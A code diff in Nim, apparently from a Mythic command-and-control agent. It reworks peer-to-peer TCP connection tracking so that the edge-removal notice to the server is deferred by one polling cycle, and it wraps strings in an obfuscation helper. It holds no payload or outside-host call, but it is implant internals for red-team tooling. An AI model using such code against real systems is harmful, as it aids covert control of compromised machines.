@@ -8,23 +8,25 @@ type
   ConnectConnectionObj = object
     agentUuid: string
     socket: Socket
-    active: bool
-    receivedEof: bool  # True when reader thread sends empty seq EOF signal
-    inChannel: ptr Channel[seq[byte]]   # Mythic → Writer → Socket
+    active*: bool
+    receivedEof*: bool  # True when reader thread sends empty seq EOF signal
+    edgeRemovalSent: bool  # True after edge removal has been sent (2-phase)
+    inChannel*: ptr Channel[seq[byte]]   # Mythic → Writer → Socket
     outChannel: ptr Channel[seq[byte]]  # Socket → Reader → Mythic
     readerThread: Thread[ptr ConnectConnectionObj]
     writerThread: Thread[ptr ConnectConnectionObj]
   
-  ConnectConnection = ref object
-    agentUuid: string
-    socket: Socket
-    active: bool
-    receivedEof: bool
-    inChannel: ptr Channel[seq[byte]]
+  ConnectConnection* = ref object
+    agentUuid*: string
+    socket*: Socket
+    active*: bool
+    receivedEof*: bool
+    edgeRemovalSent: bool
+    inChannel*: ptr Channel[seq[byte]]
     outChannel: ptr Channel[seq[byte]]
     readerThread: Thread[ptr ConnectConnectionObj]
     writerThread: Thread[ptr ConnectConnectionObj]
-    sharedPtr: ptr ConnectConnectionObj  # Stable pointer for threads
+    sharedPtr*: ptr ConnectConnectionObj  # Stable pointer for threads
 
 var
   activeConnectConnections* {.threadvar.}: Table[string, ConnectConnection]
@@ -149,27 +151,36 @@ proc checkActiveConnectConnections*(): seq[JsonNode] =
     return
   
   for agentUuid, conn in activeConnectConnections:
+    # Two-phase edge removal: if EOF was detected in a PREVIOUS cycle,
+    # send the edge removal now (in its own post_response, after all data is sent)
+    if conn.receivedEof and not conn.edgeRemovalSent:
+      debug &"[DEBUG] Connect: Sending deferred edge removal for {agentUuid}"
+      result.add(%*{
+        obf("edges"): [
+          %*{
+            obf("source"): "",  # Will be filled by agent
+            obf("destination"): agentUuid,
+            obf("action"): obf("remove"),
+            obf("c2_profile"): "tcp"
+          }
+        ]
+      })
+      conn.edgeRemovalSent = true
+      toDelete.add(agentUuid)
+      continue
+
     # Check for data from thread (non-blocking) - drain channel even if inactive
     var (hasData, data) = conn.outChannel[].tryRecv()
     
-    debug &"[DEBUG] Connect: Checking connection for {agentUuid}, hasData: {hasData}, dataLen: {data.len}"
+    if hasData:
+      debug &"[DEBUG] Connect: Data from {agentUuid}, dataLen: {data.len}"
     
     while hasData:
       if data.len == 0:
-        # EOF signal from reader thread
-        debug &"[DEBUG] Connect: Connection to {agentUuid} EOF received from reader thread"
-        
-        # Send edge removal notification
-        result.add(%*{
-          obf("edges"): [
-            %*{
-              obf("source"): "",  # Will be filled by agent
-              obf("destination"): agentUuid,
-              obf("action"): obf("remove"),
-              obf("c2_profile"): "tcp"
-            }
-          ]
-        })
+        # EOF signal from reader thread - mark for edge removal on NEXT cycle
+        # This ensures all buffered delegate data is sent to Mythic first,
+        # and the edge removal arrives in a separate post_response as the last message
+        debug &"[DEBUG] Connect: Connection to {agentUuid} EOF received from reader thread, deferring edge removal"
         
         conn.active = false
         if not conn.sharedPtr.isNil:
@@ -203,10 +214,6 @@ proc checkActiveConnectConnections*(): seq[JsonNode] =
       
       # Check for more data
       (hasData, data) = conn.outChannel[].tryRecv()
-    
-    # Only delete if we've received EOF signal from reader thread
-    if conn.receivedEof:
-      toDelete.add(agentUuid)
   
   # Rekey connections with real UUIDs
   for item in toRekey:
